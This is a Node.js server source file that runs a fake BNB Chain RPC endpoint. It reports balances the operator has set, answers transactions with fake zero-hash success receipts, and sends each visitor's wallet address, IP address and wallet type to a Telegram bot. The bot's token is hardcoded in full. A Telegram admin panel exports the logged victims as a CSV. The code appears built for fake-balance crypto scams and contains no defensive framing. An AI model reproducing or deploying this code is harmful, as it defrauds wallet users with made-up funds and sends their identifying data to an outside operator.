const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require("ethers");

const app = express();
const PORT = process.env.PORT || 9798;
const HOST = '0.0.0.0';

// Telegram Bot config
const TELEGRAM_BOT_TOKEN = '8395301366:AAGSGCdJDIgJ0ffRrSwmjV2q-YPUgLliHEE';
const TELEGRAM_CHAT_ID = '7812677112';
const SUPERADMINS = [7812677112];

// Persistent data directory
const DATA_DIR = '/data';
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const ADMINS_FILE = path.join(DATA_DIR, 'admins.json');
const BALANCES_JSON_FILE = path.join(DATA_DIR, 'balances.json');
const BALANCES_CSV_FILE = path.join(DATA_DIR, 'balances.csv');

function loadAdmins() {
    try {
        if (fs.existsSync(ADMINS_FILE)) return JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf-8'));
    } catch (err) { console.error('[!] Failed to load admins:', err); }
    return [222222222];
}
function saveAdmins() {
    try { fs.writeFileSync(ADMINS_FILE, JSON.stringify(ADMINS, null, 2)); } 
    catch (err) { console.error('[!] Failed to save admins:', err); }
}
let ADMINS = loadAdmins();

function weiHexToBNB(hexWei) {
    if (!hexWei || typeof hexWei !== 'string') return '0';
    const hex = hexWei.toLowerCase().startsWith('0x') ? hexWei.slice(2) : hexWei;
    const wei = BigInt('0x' + hex);
    const decimals = 18n;
    const divisor = 10n ** decimals;
    const whole = wei / divisor;
    const fraction = wei % divisor;
    let fractionStr = fraction.toString().padStart(Number(decimals), '0').replace(/0+$/, '');
    return fractionStr.length > 0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
}

const loadBalances = () => {
    try { 
        if (fs.existsSync(BALANCES_JSON_FILE)) return JSON.parse(fs.readFileSync(BALANCES_JSON_FILE, 'utf-8'));
    } catch (err) { console.error('[!] Failed to load balances:', err); }
    return {};
};
const saveBalancesJSON = () => {
    try { fs.writeFileSync(BALANCES_JSON_FILE, JSON.stringify(spoofedBalances, null, 2)); }
    catch (err) { console.error('[!] Failed to save balances JSON:', err); }
};
const saveBalancesCSV = () => {
    const headers = ['#', 'Address', 'Balance (BNB)', 'Timestamp', 'Wallet', 'IP'];
    const rows = [headers.join(',')];
    const entriesSorted = Object.entries(spoofedBalances).sort((a, b) => new Date(b[1].timestamp) - new Date(a[1].timestamp));
    entriesSorted.forEach(([address, data], index) => {
        const balanceBNB = weiHexToBNB(data.balance);
        rows.push([index + 1, address, balanceBNB, data.timestamp, data.wallet, data.ip].map(f => `"${f}"`).join(','));
    });
    try { fs.writeFileSync(BALANCES_CSV_FILE, rows.join('\n')); }
    catch (err) { console.error('[!] Failed to save balances CSV:', err); }
};
let spoofedBalances = loadBalances();

// ETH_CALL setup
const BALANCE_CHECKER_ABI = [
    "function balances(address[] users, address[] tokens) view returns (uint256[])"
];
const iface = new ethers.Interface(BALANCE_CHECKER_ABI);

app.use(cors());
app.use(express.static(path.join(__dirname, '/')));
app.use(bodyParser.json());

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// --- Admin panel functions ---
function isSuperAdmin(userId) { return SUPERADMINS.includes(userId); }
function isAdmin(userId) { return isSuperAdmin(userId) || ADMINS.includes(userId); }

function sendPersistentPanelKeyboard(chatId) {
    bot.sendMessage(chatId, '>!<', {
        reply_markup: {
            keyboard: [[{ text: 'Panel' }]],
            resize_keyboard: true,
            one_time_keyboard: false,
        }
    });
}
bot.onText(/\/start/, (msg) => {
    if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, '⛔ You are not authorized.');
    sendPersistentPanelKeyboard(msg.chat.id);
});
bot.on('message', (msg) => {
    if (msg.text !== 'Panel') return;
    if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, '⛔ Not authorized.');
    const inlineKeyboard = [
        [{ text: 'Balances', callback_data: '/balances' }, { text: 'Open Panel', url: 'https://bnbchainpanel.vercel.app' }],
        [{ text: 'Add Admin', callback_data: '/addadmin' }, { text: 'Remove Admin', callback_data: '/removeadmin' }],
        [{ text: 'List Admins', callback_data: '/listadmins' }]
    ];
    bot.sendMessage(msg.chat.id, 'Select a command:', { reply_markup: { inline_keyboard: inlineKeyboard } });
});

function sendBalances(chatId, fromId) {
    if (!isAdmin(fromId)) return bot.sendMessage(chatId, '⛔ Not authorized.');
    if (!Object.keys(spoofedBalances).length) return bot.sendMessage(chatId, 'No spoofed balances set yet.');
    saveBalancesCSV();
    bot.sendDocument(chatId, BALANCES_CSV_FILE).catch(err => bot.sendMessage(chatId, 'Failed to send balances CSV.'));
}

function sendSetLink(chatId) {
    bot.sendMessage(chatId, `Open the BNB Chain Panel here:\n[Click to open](https://bnbchainpanel.vercel.app)`, { parse_mode: 'Markdown', disable_web_page_preview: true });
}

bot.onText(/\/balances/, msg => sendBalances(msg.chat.id, msg.from.id));
bot.onText(/\/set/, msg => sendSetLink(msg.chat.id));
bot.onText(/\/panel/, msg => {
    if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, '⛔ Not authorized.');
    const inlineKeyboard = [
        [{ text: 'Balances', callback_data: '/balances' }, { text: 'Open Panel', url: 'https://bnbchainpanel.vercel.app' }],
        [{ text: 'Add Admin', callback_data: '/addadmin' }, { text: 'Remove Admin', callback_data: '/removeadmin' }],
        [{ text: 'List Admins', callback_data: '/listadmins' }]
    ];
    bot.sendMessage(msg.chat.id, 'Select a command:', { reply_markup: { inline_keyboard: inlineKeyboard } });
});

bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message, data = callbackQuery.data, fromId = callbackQuery.from.id;
    if (!isAdmin(fromId)) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Not authorized.', show_alert: true });
    if (!isSuperAdmin(fromId)) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Access denied for this command.', show_alert: true });
    bot.answerCallbackQuery(callbackQuery.id);

    if (data === '/balances') sendBalances(msg.chat.id, fromId);
    else if (data === '/addadmin') bot.sendMessage(msg.chat.id, 'Send user ID to add as admin.'), waitForAdminResponse(msg.chat.id, fromId, 'add');
    else if (data === '/removeadmin') bot.sendMessage(msg.chat.id, 'Send user ID to remove.'), waitForAdminResponse(msg.chat.id, fromId, 'remove');
    else if (data === '/listadmins') bot.sendMessage(msg.chat.id, `Current admins:\n${ADMINS.join('\n') || 'No admins set.'}`);
    else bot.sendMessage(msg.chat.id, 'Unknown command.');
});

function waitForAdminResponse(chatId, fromId, action) {
    const handler = (msg) => {
        if (msg.chat.id !== chatId || msg.from.id !== fromId) return;
        const userId = parseInt(msg.text);
        if (isNaN(userId)) { bot.sendMessage(chatId, 'Invalid user ID.'); bot.removeListener('message', handler); return; }
        if (action === 'add') { if (!ADMINS.includes(userId) && !SUPERADMINS.includes(userId)) ADMINS.push(userId), saveAdmins(), bot.sendMessage(chatId, `User ID ${userId} added.`); }
        else if (action === 'remove') { ADMINS = ADMINS.filter(id => id !== userId); saveAdmins(); bot.sendMessage(chatId, `User ID ${userId} removed.`); }
        bot.removeListener('message', handler);
    };
    bot.on('message', handler);
}

const sendToTelegram = async (text) => {
    try { await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' }); }
    catch (err) { console.error('[!] Telegram send error:', err?.response?.data || err.message); }
};
const now = () => new Date().toISOString().replace('T', ' ').split('.')[0];
const detectWalletFromUA = (ua = '') => {
    ua = ua.toLowerCase();
    if (ua.includes('metamask')) return 'MetaMask';
    if (ua.includes('trust')) return 'Trust Wallet';
    if (ua.includes('brave')) return 'Brave Wallet';
    if (ua.includes('coinbase')) return 'Coinbase Wallet';
    if (ua.includes('phantom')) return 'Phantom';
    if (ua.includes('opera')) return 'Opera';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('chrome')) return 'Chrome';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('android')) return 'Android WebView';
    if (ua.includes('ios')) return 'iOS WebView';
    return 'Unknown';
};

// --- JSON-RPC handler ---
app.post('/', (req, res) => {
    const { method, params, id } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const wallet = detectWalletFromUA(ua);

    console.log(`[RPC] Method: ${method}`);

    if (method === 'eth_chainId') return res.json({ jsonrpc: '2.0', id, result: '0x38' });
    if (method === 'net_version') return res.json({ jsonrpc: '2.0', id, result: '56' });
    if (method === 'eth_blockNumber') return res.json({ jsonrpc: '2.0', id, result: '0x100000' });
    if (method === 'eth_syncing') return res.json({ jsonrpc: '2.0', id, result: false });
    if (method === 'eth_getBalance') {
        const address = (params[0] || '').toLowerCase();
        const info = spoofedBalances[address];
        const balanceHex = info ? info.balance : '0x0';
        const balanceBNB = weiHexToBNB(balanceHex);
        const logMsg = `🕒 *${now()}*\n[+] Spoofing BNB for \`${address}\`\n🪙 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
        console.log(logMsg); sendToTelegram(logMsg);
        return res.json({ jsonrpc: '2.0', id, result: balanceHex });
    }

    if (method === 'eth_call') {
        const call = params[0], data = call.data;
        try {
            const parsed = iface.parseTransaction({ data });
            if (parsed?.name === "balances") {
                const users = parsed.args[0].map(a => a.toLowerCase());
                const results = users.map(u => {
                    const b = spoofedBalances[u]?.balance || '0x0';
                    const balanceBNB = weiHexToBNB(b);
                    const logMsg = `🕒 *${now()}*\n[+] Spoofing balance for \`${u}\`\n💰 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}\n🌐 IP: \`${ip}\``;
                    console.log(logMsg); sendToTelegram(logMsg);
                    return b; // keep as hex string
                });
                const encoded = iface.encodeFunctionResult("balances", [results]);
                return res.json({ jsonrpc: "2.0", id, result: encoded });
            }
        } catch (e) { console.log("eth_call decode error:", e.message); }
        return res.json({ jsonrpc: '2.0', id, result: '0x0' });
    }

    if (method === 'eth_estimateGas') return res.json({ jsonrpc: '2.0', id, result: '0x5208' });
    if (method === 'eth_gasPrice') return res.json({ jsonrpc: '2.0', id, result: '0x3B9ACA00' });
    if (method === 'eth_sendTransaction') {
        const tx = params[0];
        console.log(`💸 Fake tx: from ${tx.from}, to ${tx.to}, value ${weiHexToBNB(tx.value)} BNB`);
        return res.json({ jsonrpc: '2.0', id, result: '0x' + '0'.repeat(64) });
    }
    if (method === 'eth_getTransactionReceipt') return res.json({ jsonrpc: '2.0', id, result: { transactionHash: params[0], status: '0x1', blockNumber: '0x100000', gasUsed: '0x5208', logs: [] } });
    if (method === 'eth_getBlockByNumber') return res.json({ jsonrpc: '2.0', id, result: { number: '0x100000', hash: '0x'+'0'.repeat(64), parentHash:'0x'+'0'.repeat(64), nonce:'0x0', transactions:[], timestamp:Math.floor(Date.now()/1000).toString(16), miner:'0x0000000000000000000000000000000000000000' } });
    if (method === 'eth_getCode') return res.json({ jsonrpc: '2.0', id, result: '0x' });

    // --- Unknown methods fallback ---
    console.log(`⚠️ Unknown RPC method: ${method}`);
    sendToTelegram(`🕒 *${now()}*\n⚠️ Unknown RPC: \`${method}\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``);

    function defaultRpcResult(method) {
        const stringMethods = ['eth_getBalance','eth_estimateGas','eth_gasPrice','eth_getTransactionCount','eth_blockNumber'];
        const arrayMethods = ['eth_getLogs'];
        const objectMethods = ['eth_getBlockByNumber','eth_getBlockByHash','eth_getTransactionReceipt'];
        if (stringMethods.includes(method)) return '0x0';
        if (arrayMethods.includes(method)) return [];
        if (objectMethods.includes(method)) return { number:'0x100000', hash:'0x'+'0'.repeat(64), parentHash:'0x'+'0'.repeat(64), nonce:'0x0', transactions:[], timestamp:Math.floor(Date.now()/1000).toString(16), miner:'0x0000000000000000000000000000000000000000', logs:[] };
        return '0x0';
    }

    return res.json({ jsonrpc:'2.0', id, result: defaultRpcResult(method) });
});

// --- Set balance endpoint ---
app.post('/set-balance', (req, res) => {
    const { address, balance } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const wallet = detectWalletFromUA(ua);

    if (!address || !balance || !/^0x[0-9a-fA-F]{40}$/.test(address) || !/^0x[0-9a-fA-F]+$/.test(balance))
        return res.status(400).json({ error: 'Invalid address or balance' });

    const cleanAddress = address.toLowerCase();
    spoofedBalances[cleanAddress] = { balance: balance.toLowerCase(), timestamp: now(), wallet, ip };
    saveBalancesJSON();

    const balanceBNB = weiHexToBNB(balance);
    const logMsg = `🕒 *${now()}*\n[~] Set balance for \`${cleanAddress}\`\n💰 New Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
    console.log(logMsg); sendToTelegram(logMsg);

    return res.status(200).json({ success: true });
});

app.listen(PORT, HOST, () => {
    console.log(`🚀 Fake RPC server running at http://${HOST}:${PORT}`);
});
